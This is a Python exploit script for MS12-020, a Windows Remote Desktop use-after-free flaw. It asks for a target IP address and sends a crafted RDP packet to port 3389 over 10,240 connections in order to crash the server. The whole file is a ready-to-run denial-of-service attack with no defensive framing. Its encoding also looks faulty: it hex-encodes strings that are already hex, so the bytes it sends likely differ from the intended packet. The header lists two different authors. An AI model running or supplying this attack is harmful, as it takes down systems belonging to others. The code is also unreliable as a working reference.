# coding=utf-8
# Exploit Title: Pakyu Cenloder
# Date: March 16 2012
# Author: BMario
# Application Link: Microsoft Terminal Services / Remote Desktop Services
#          http://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx
# Version: any Windows version before 13 Mar 2012
# Platforms:    Windows
# Bug:          use after free
# Exploitation: remote, versus server
# Author:       Stanley Marshall
# Tested on: Windows 7 32bit
# CVE : MS12-020

import socket
import binascii
# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("Microsoft Terminal Services / Remote Desktop Services - Denial of Service")

headpack = binascii.hexlify(b"030000130ee000000000000100080000000000")

dafuq = b"030001d602f0807f658201940401010401010101f" \
        b"f3019020400000000020400000002020400000000" \
        b"0204000000010204000000000204000000010202f" \
        b"fff02040000000230190204000000010204000000" \
        b"01020400000001020400000001020400000000020" \
        b"40000000102020420020400000002301c0202ffff" \
        b"0202fc170202ffff0204000000010204000000000" \
        b"204000000010202ffff0204000000020482013300" \
        b"0500147c0001812a000800100001c000447563618" \
        b"11c01c0d800040008008002e00101ca03aa090400" \
        b"00ce0e000048004f0053005400000000000000000" \
        b"00000000000000000000000000000000004000000" \
        b"000000000c0000000000000000000000000000000" \
        b"00000000000000000000000000000000000000000" \
        b"00000000000000000000000000000000000000000" \
        b"00000000000000000000001ca0100000000001000" \
        b"07000100300030003000300030002d00300030003" \
        b"0002d0030003000300030003000300030002d0030" \
        b"00300030003000300000000000000000000000000" \
        b"000000000000000000000000004c00c000d000000" \
        b"0000000002c00c001b0000000000000003c02c000" \
        b"3000000726470647200000000008080636c697072" \
        b"6472000000a0c0726470736e640000000000c0"

dafuq = binascii.hexlify(dafuq)

dafree = binascii.hexlify(b"0300000802f08028")

trololo = headpack + dafuq + dafree

#HOSTNYO = sys.argv[1]
HOSTNYO = input("Enter the IP address to crash (remote desktop): ")
PORTNYO = 3389
for i in range(10240):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOSTNYO, PORTNYO))
    s.send(trololo)
    rec = s.recv(1024)
    s.close()
